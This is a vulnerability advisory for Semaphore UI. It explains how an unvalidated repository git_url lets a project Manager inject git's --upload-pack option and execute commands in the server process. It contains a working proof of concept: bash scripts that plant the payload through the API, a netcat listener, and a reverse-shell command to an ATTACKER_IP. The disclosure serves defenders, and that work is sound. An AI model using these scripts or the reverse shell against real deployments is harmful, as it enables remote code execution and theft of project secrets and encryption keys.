# Semaphore U: OS Command Injection

- CWE: CWE-78, CWE-88
- Packages: go:github.com/semaphoreui/semaphore

---

# Summary
An OS command injection in repository git_url handling lets any user holding the Manager or Owner role on any project (the normal project-collaborator roles) achieve remote code execution on the Semaphore server host. Using git's --upload-pack=<cmd> option, an attacker runs arbitrary commands. The command executes inside the main Semaphore server process (via the schedule commit-hash poller), so it runs even when jobs are configured for remote runners — bypassing runner isolation and exposing the master encryption key and every project's secrets. Reproducible on a default install (git_client: cmd_git); no non-default configuration is required.

# Details
The repository git_url is attacker-controlled (HTTP body) and reaches exec.Command("git", ...) unvalidated. Two missing controls cause this:

1. git_url is never validated against option injection.
Repository.Validate() (db/Repository.go, ~lines 138–156) validates the branch via ValidateGitBranch (db/git_branch.go, which rejects a leading -), but performs no equivalent check on GitURL (only "non-empty"). ValidateRepository (db/Store.go, ~802–806) only checks the SSH key. CreateRepository (db/sql/repository.go, ~76–95) stores it verbatim. Because --upload-pack=... has no scheme:// and no leading /, GetType() (db/Repository.go, ~113–136) classifies it as RepositorySSH and GetGitURL(false) (~72–111) returns it raw/unchanged.

2. The git command is built with no -- separator.
CmdGitClient.GetLastRemoteCommitHash (db_lib/CmdGitClient.go, ~169–185) calls:
c.output(r, GitRepositoryTmpPath, "ls-remote",
           r.Repository.GetGitURL(false),   // attacker-controlled
           r.Repository.GitBranch)          // "master"
output (~79–93) → makeCmd (~21–60): exec.Command("git") (line ~27), cmd.Args = append(cmd.Args, args...) (line ~55). The resulting argv has no --:
["git", "ls-remote", "--upload-pack=<cmd>;true", "master"]
git parses --upload-pack=... as an option; master becomes the (local-transport) repository operand; git then executes the upload-pack value through a shell (sh -c "<cmd> 'master'"), running <cmd>. This is intended git behavior — the fault is Semaphore passing untrusted data as argv. (The command runs even though git subsequently prints fatal: Could not read from remote repository and exits 128, and even though master is not a real path.)

### Trigger — it fires in the server process.
A project schedule with a repository_id causes the scheduler to run git ls-remote to check for new commits. AddSchedule (api/projects/schedules.go, ~130–160; validateSchedulePayload ~86–118 validates only the cron format — it does not require the repo to be tied to the template). The schedule pool is started in the server process: runService in cli/cmd/root.go (CreateSchedulePool ~line 115, go schedulePool.Run() ~line 193), independent of remote-runner config. On each tick, ScheduleRunner.Run (services/schedules/SchedulePool.go, ~96–193, line ~117) calls tryUpdateScheduleCommitHash (~61–94) — before the HA de-dup lock (~145) — which loads the repo by repository_id and calls GetLastRemoteCommitHash(). Refresh (~265–358, line 287) registers such schedules even when inactive, so deactivating does not stop it.

### Entry points:
POST /api/project/{id}/repositories (api/projects/repository.go:AddRepository, ~101–137) stores the payload; POST /api/project/{id}/schedules arms it. Both are gated by GetMustCanMiddleware(db.CanManageProjectResources) (api/router.go ~294/310/327), a permission held by ProjectManager/ProjectOwner (db/ProjectUser.go, ~22–27).

# PoC
Environment: the official semaphore v2.18.12 binary; git, python3, nc present. This PoC uses the default git client and non_admin_can_create_project: false; the attacker lowpriv is onboarded by the admin as a normal Manager (no special configuration).

### Terminal 1 — config + users + server
```
  cd ~/PoC && mkdir -p tmp
  cat > config.json <<EOF
  { "sqlite":{"host":"$PWD/database.sqlite"},"dialect":"sqlite","tmp_path":"$PWD/tmp",
    "port":":3000","interface":"127.0.0.1",
    "cookie_hash":"$(head -c32 /dev/urandom|base64)","cookie_encryption":"$(head -c32 /dev/urandom|base64)",
    "access_key_encryption":"$(head -c32 /dev/urandom|base64)","git_client":"cmd_git",
    "non_admin_can_create_project":false,"web_host":"http://127.0.0.1:3000/" }
  EOF
  ./semaphore user add --admin --login admin  --name Admin --email admin@example.com --password 'Admin123!'  --config config.json
  ./semaphore user add        --login lowpriv --name Low   --email low@example.com   --password 'LowPriv123!' --config config.json
  ./semaphore server --config config.json
```
### Terminal 2 — attacker listener
```
  nc -lvnp 4444
```
### Terminal 3 — admin onboards lowpriv as Manager, then lowpriv exploits
```
  cd ~/PoC

  cat > onboard.sh <<'EOF'
  #!/usr/bin/env bash
  set -euo pipefail
  BASE="${BASE:-http://127.0.0.1:3000}"
  ADMIN="${ADMIN:-admin}"; ADMIN_PASS="${ADMIN_PASS:-Admin123!}"; MEMBER="${MEMBER:-lowpriv}"
  JAR=$(mktemp)
  curl -s -c "$JAR" -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"auth\":\"$ADMIN\",\"password\":\"$ADMIN_PASS\"}" >/dev/null
  PROJ_PID=$(curl -s -b "$JAR" -X POST "$BASE/api/projects" -H 'Content-Type: application/json' \
    -d '{"name":"team-project","alert":false}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
  USER_ID=$(curl -s -b "$JAR" "$BASE/api/users" | \
    python3 -c "import sys,json;print(next(u['id'] for u in json.load(sys.stdin) if u['username']=='$MEMBER'))")
  curl -s -b "$JAR" -X POST "$BASE/api/project/$PROJ_PID/users" -H 'Content-Type: application/json' \
    -d "{\"user_id\":$USER_ID,\"role\":\"manager\"}" -o /dev/null
  rm -f "$JAR"; echo "[*] $MEMBER is Manager of project $PROJ_PID" >&2; echo "$PROJ_PID"
  EOF
  chmod +x onboard.sh

  cat > rce.sh <<'EOF'
  #!/usr/bin/env bash
  set -euo pipefail
  BASE="${BASE:-http://127.0.0.1:3000}"; LOGIN="${LOGIN:-lowpriv}"; PASS="${PASS:-LowPriv123!}"
  PROJ_PID="${PROJ_PID:?set PROJ_PID from onboard.sh}"
  CMD="$*"; B64=$(printf '%s' "$CMD" | base64 -w0)
  GITURL="--upload-pack=bash -c \"echo $B64 | base64 -d | bash\";true"
  JAR=$(mktemp); jid(){ python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])'; }
  post(){ curl -s -b "$JAR" -X POST "$BASE$1" -H 'Content-Type: application/json' -d "$2"; }
  curl -s -c "$JAR" -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"auth\":\"$LOGIN\",\"password\":\"$PASS\"}" >/dev/null
  KID=$(post /api/project/$PROJ_PID/keys "{\"name\":\"k\",\"type\":\"none\",\"project_id\":$PROJ_PID}" | jid)
  BODY=$(python3 -c "import json,sys;print(json.dumps({'name':'r','project_id':$PROJ_PID,'git_url':sys.argv[1],'git_branch':'master','ssh_key_id':$KID}))" "$GITURL")
  RID=$(post /api/project/$PROJ_PID/repositories "$BODY" | jid)
  TID=$(post /api/project/$PROJ_PID/templates "{\"name\":\"t\",\"project_id\":$PROJ_PID,\"app\":\"bash\",\"playbook\":\"n.sh\",\"repository_id\":$RID,\"type\":\"\"}" | jid)
  post /api/project/$PROJ_PID/schedules "{\"name\":\"s\",\"project_id\":$PROJ_PID,\"template_id\":$TID,\"repository_id\":$RID,\"cron_format\":\"* * * * *\"}" >/dev/null
  rm -f "$JAR"; echo "[*] queued as lowpriv (Manager of $PROJ_PID): $CMD"
  EOF
  chmod +x rce.sh

  PROJ_PID=$(./onboard.sh)
  ATTACKER_IP=127.0.0.1
  PROJ_PID=$PROJ_PID ./rce.sh "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
```

Within ~60 s the schedule fires and the Semaphore server process connects back to the listener (Terminal 2), giving an interactive shell as the server user. Verify with id and cat ~/PoC/config.json (the server can read its own access_key_encryption master key).

# Impact
- Type: OS command injection via argument injection — remote code execution.
- Who is impacted: any Semaphore deployment running the default git_client: cmd_git. The attacker only needs an authenticated account holding the Manager or Owner role on any project — the standard collaborator roles. (If non_admin_can_create_project is enabled, literally any authenticated user qualifies, since they can self-create a project and become its Owner. Global admins always qualify.)
